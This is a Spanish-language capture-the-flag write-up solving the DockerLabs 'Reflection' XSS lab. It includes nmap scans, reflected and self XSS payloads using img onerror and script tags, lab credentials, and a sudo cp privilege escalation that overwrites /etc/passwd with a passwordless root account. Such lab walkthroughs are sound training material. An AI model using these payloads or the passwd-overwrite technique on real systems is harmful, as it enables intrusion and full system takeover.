#MAQUINA #DOCKERLABS #FACIL
#XSS #CROSS_SITE_SCRIPTING
<hr>

# RECONOCIMIENTO

Vamos a resolver **Reflection** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 16:18 CET
Initiating ARP Ping Scan at 16:18
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 16:18, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:18
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 16:18, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-01-30 16:18:23 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 16:18 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 89:6c:a5:af:d5:e2:83:6c:f9:87:33:44:0f:78:48:3a (ECDSA)
|_  256 65:32:42:95:ca:d0:53:bb:28:a5:15:4a:9c:14:64:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Laboratorio de Cross-Site Scripting (XSS)
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 16:19 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

Vemos que es un laboratorio preparado para practicar XSS.

# EXPLOTACION

## LABORATORIO 1 (REFLECTED XSS)

Vemos que si metemos una etiqueta h1 (**HTMLI**):

``` html
<h1>HOLA</h1>
```

Podemos ver que se interpreta y es vulnerable a una **HTML Injection**.

Ahora probaremos a meter una imagen y al dar error meteremos un alert:
``` html
<img src="src" onerror=alert('1') >
```

**VULNERADO**
## LABORATORIO 2 (SELF XSS)

Ahora probaremos a meter una imagen y al dar error meteremos un alert, cerrando el value y div para colar nuestro script:

```html

vicks"><img src="src" onerror=alert('1') >

```

**VULNERADO**
## LABORATORIO 3 (REFLECTED XSS CON DROPDOWNS)

Ahora probaremos a meter una imagen por la opción que se pasa por URL y al dar error meteremos un alert:

```

http://172.17.0.2/172.17.0.2/laboratorio3/?opcion1=<img src=xxx onerror=alert('1')>&opcion2=ValorX&opcion3=Opcion1

```

**VULNERADO**

## LABORATORIO 4(REFLECTED XSS POR URL)

```

http://172.17.0.2/laboratorio4/?data=%3Cscript%3Ealert(%271%27)%3C/script%3E

```

**VULNERADO**
# ESCALADA DE PRIVILEGIOS

Al completar los labs, te dan las credenciales de balu.

Tras echar un ojo vemos que hay un **secret.bak** con las credenciales de balulito

**Usuario -> balulito**
**Contra -> balulerochingon**

ESTAMOS COMO BALULITO

Vemos si el usuario tiene permisos SUDO:
   ```bash
balulito@857ab24bf0f1:/$ sudo -l
Matching Defaults entries for balulito on 857ab24bf0f1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User balulito may run the following commands on 857ab24bf0f1:
    (ALL) NOPASSWD: /bin/cp


```

Vemos **cp** con permisos SUDO , modificamos el /etc/passwd copiando la linea de root y quitandole la x para que no pida contra:
   ```bash
balulito@857ab24bf0f1:/tmp$ echo "root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balu:x:1000:1000:balu,,,:/home/balu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
balulito:x:1001:1001:balulito,,,:/home/balulito:/bin/bash
newroot::0:0:root:/root:/bin/bash" | sudo cp /dev/stdin /etc/passwd
balulito@857ab24bf0f1:/tmp$ su newroot
root@857ab24bf0f1:/tmp# whoami
root
root@857ab24bf0f1:/tmp# 
```

**YA ESTAMOS COMO ROOT.**